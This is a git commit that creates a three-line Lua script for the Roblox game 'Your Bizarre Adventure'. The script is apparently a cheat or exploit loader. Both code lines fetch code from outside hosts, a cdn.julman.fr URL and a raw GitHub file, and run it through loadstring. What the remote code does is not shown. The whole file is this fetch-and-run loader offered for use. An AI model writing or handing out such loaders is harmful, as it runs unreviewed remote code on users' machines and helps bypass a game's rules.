ce005a97689d0b05bfbde121c11753d4f639a9a1
Trix <80095537+TrixAde@users.noreply.github.com>
2021-09-05 22:05:30 +0200

    Create your-bizarre-adventure.lua

---
+++ your-bizarre-adventure.lua
@@ -0,0 +1,3 @@
+pcall(loadstring(game:HttpGet("https://cdn.julman.fr/scripts/35.lua")))
+---------------------------------------------------------------------------------------------------
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MidnightKittenCat/script-idk/main/YBA.lua"))()
